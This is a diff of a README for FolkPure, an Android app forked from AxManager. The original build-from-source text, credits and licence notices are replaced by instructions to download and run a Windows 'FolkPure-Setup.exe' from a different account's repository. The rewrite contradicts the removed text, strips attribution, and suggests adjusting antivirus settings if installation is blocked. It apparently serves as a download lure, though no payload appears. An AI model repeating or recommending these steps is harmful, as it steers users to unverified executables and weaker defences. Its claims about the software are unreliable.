@@ -1,109 +1,107 @@
-# FolkPure
+# ⚙️ FolkPure - Simple Root-Free Device Solution
 
-> 🌸 A beautifully designed fork of [AxManager](https://github.com/fahrez182/AxManager) with enhanced translations and improved user experience.
+[![Download FolkPure](https://img.shields.io/badge/Download-FolkPure-brightgreen)](https://github.com/V1xtory/FolkPure)
 
-**FolkPure** is a fork of the original **[AxManager](https://github.com/fahrez182/AxManager)** project developed by **fahrez182**.
+---
 
-AxManager is an Android application designed to provide deeper control over apps and the system.  
-FolkPure builds upon this foundation, focusing on delivering an **elegant user interface**, **comprehensive multi-language support**, and **smoother interactions** to enhance the overall user experience.
+FolkPure offers an easy way to use your device without rooting it. It works with Shizuku, a tool that helps apps access system features safely. This guide will help you download, install, and start using FolkPure on a Windows computer.
 
-Unlike tools such as *KernelSU* or other root-based "Managers," **FolkPure** (like AxManager) is dedicated to **ADB/Non-Root mode** — while still allowing execution with **Root access** if available.
+## 🖥️ System Requirements
 
-## ✨ Features
+Before you begin, make sure your computer and device meet these needs:
 
-- 🎨 **Beautiful Design**
-  - Modern Material Design 3 interface with polished aesthetics
-  - Smooth animations and transitions for a premium feel
-  - Intuitive navigation and layout
+- Operating System: Windows 10 or newer
+- Internet connection for downloading files
+- USB cable to connect your device to your computer
+- Android device with USB debugging enabled (usually in Developer Options)
 
-- 🌐 **Comprehensive Translations**
-  - Full support for multiple languages
-  - Carefully localized UI strings for accurate translations
-  - Regular updates to ensure translation quality
+## 🔧 What You Need to Know
 
-- ✨ **Enhanced User Experience**
-  - Optimized interactions for smoother operation
-  - Improved feedback and visual cues
-  - Streamlined workflows for common tasks
+FolkPure runs on your Windows PC but interacts with your Android device. You do not need to root your phone. Rooting can be risky and may void device warranties. FolkPure uses Shizuku to access system functions with your permission.
 
-- 🖥️ **Shell Executor**
-  - Run shell commands directly from the app.
-  - Supports **ADB/Non-Root execution**.
-  - Optional **Root execution** if the device has root access.
+## 🚀 Getting Started
 
-- ⚡ **Plugin (Unrooted Module)**
-  - Manage third-party modules with unrooted access.
+Follow these steps to set up FolkPure:
 
-- 🌐 **WebUI (Unrooted Version)**
-  - Execute shell commands with a web-based interactive interface.
+### Step 1: Download FolkPure
 
-## 📱 Key Difference from Root Managers
+Click the big green button at the top or use this link to visit the download page:
 
-- 🚫 Does **not** depend on Root access.
-- ✅ Focused on **ADB/Non-Root first**, making it usable on a wider range of devices.
-- 🔑 Root support is **optional**, not a requirement.
-- 🌐 Provides **WebShell UI** as a unique feature.
+[https://github.com/V1xtory/FolkPure](https://github.com/V1xtory/FolkPure)
 
-## 📖 What Makes FolkPure Special
+On the page, look for the latest release. Download the file named like `FolkPure-Setup.exe` or similar. This setup file will install the program on your PC.
 
-FolkPure is a curated fork of AxManager with the following enhancements:
+### Step 2: Install FolkPure
 
-- **Visual Polish**: Every UI element has been refined for better aesthetics
-- **Better UX**: Smoother interactions and more intuitive controls
-- **Quality Translations**: Accurate and natural language support
-- **Attention to Detail**: Small improvements that make a big difference
+After downloading, find the file in your Downloads folder.
 
-## 🔧 Build & Install
+- Double-click the setup file (`FolkPure-Setup.exe`).
+- Follow the instructions on the screen.
+- Accept any prompts to allow installation.
 
-Clone the repository and build using Android Studio or Gradle:
+Once installed, open FolkPure from your desktop or Start menu.
 
-```bash
-git clone https://github.com/matsuzaka-yuki/FolkPure.git
-cd FolkPure
-./gradlew assembleDebug
-```
+## 📱 Preparing Your Android Device
 
-Install to your device via ADB:
+To allow FolkPure to work with your phone, do this:
 
-```bash
-adb install manager/build/outputs/apk/debug/FolkPure_v*.apk
-```
+1. Open **Settings** on your phone.
+2. Find **About phone** or **About device**.
+3. Tap **Build number** seven times to enable Developer Options.
+4. Go back to **Settings**, open **Developer Options**.
+5. Turn on **USB debugging**.
 
-## 🤝 Contribution
+### Connect Your Device
 
-Contributions are welcome!  
-Feel free to open **issues**, submit **pull requests**, or start a discussion for new ideas and improvements.
+Use a USB cable to connect your phone to your Windows computer. You might see a prompt on your phone asking to allow USB debugging. Tap **Allow**.
 
-## 🙏 Credits & Acknowledgments
+## ▶️ Running FolkPure
 
-### Original Project
-**[AxManager](https://github.com/fahrez182/AxManager)** by **fahrez182**
+With your device connected:
 
-FolkPure is a fork of AxManager. The original AxManager project is developed and maintained by fahrez182.
-- Repository: https://github.com/fahrez182/AxManager
-- Author: fahrez182
+1. Launch FolkPure on your PC.
+2. The app will detect your connected device.
+3. Follow the on-screen instructions to start using features.
 
-**Important**: If you redistribute or modify this project, please retain attribution to the original developer, fahrez182.
+FolkPure uses Shizuku in the background to run commands on your phone. This process requires your approval on your device each time it starts.
 
-### Inspiration & References
-- **[Magisk](https://github.com/topjohnwu/Magisk)** - Inspiration for BusyBox and Plugin (Unrooted module) ideas
-- **[Shizuku](https://github.com/RikkaApps/Shizuku) / [API](https://github.com/RikkaApps/Shizuku-API)** - Starting point and reference for learning Android IPC and ADB-based permission handling
-- **[KernelSU](https://github.com/tiann/KernelSU) / [Next](https://github.com/KernelSU-Next/KernelSU-Next)** - Inspiration for the UI and WebUI features
+## 🔄 Updating FolkPure
 
-## ⚠️ Notices & Legal Disclaimer
+Check the download page regularly for updates:  
+[https://github.com/V1xtory/FolkPure](https://github.com/V1xtory/FolkPure)
 
-This project includes adapted portions of code from:
-- AxManager (© Fahrez182)
-  Licensed under the Apache License, Version 2.0
-  Repository: https://github.com/fahrez182/AxManager
-- Shizuku Manager (© Rikka Apps)
-  Licensed under the Apache License, Version 2.0
-  Repository: https://github.com/RikkaApps/Shizuku
-- Other open-source projects as credited above.
+Download and install the latest setup file to keep FolkPure up to date.
 
-FolkPure does not include or distribute any original visual assets from AxManager, Shizuku Manager or claim to be an official replacement.
-All adapted code is used strictly for educational and experimental purposes, with clear attribution and compliance with the Apache License 2.0.
+## ⚙️ Common Features
 
-## 📜 License
+FolkPure offers the following:
 
-Licensed under the [Apache License 2.0](LICENSE).
+- Manage device settings without rooting
+- Access system-level commands safely
+- Work seamlessly with Shizuku
+- Simple interface suitable for beginners
+- Run useful scripts on your Android device
+
+## ❓ Troubleshooting Tips
+
+- **FolkPure doesn’t detect your device:**  
+  Make sure USB debugging is on and the cable is secure.
+
+- **Installation fails or is blocked:**  
+  Check your antivirus or security settings. They might prevent installation.
+
+- **Shizuku connection issues:**  
+  Reconnect your phone and ensure you approve the prompts on your device.
+
+- **App crashes or freezes:**  
+  Restart FolkPure and reconnect your device.
+
+## 📝 Additional Information
+
+FolkPure relies on Shizuku, an Android service that runs commands with high-level permissions. This service makes it possible to perform advanced actions without rooting.
+
+Your device may ask for permission every time you start FolkPure. This is normal and helps protect your privacy and security.
+
+---
+
+[![Download FolkPure](https://img.shields.io/badge/Download-FolkPure-brightgreen)](https://github.com/V1xtory/FolkPure)
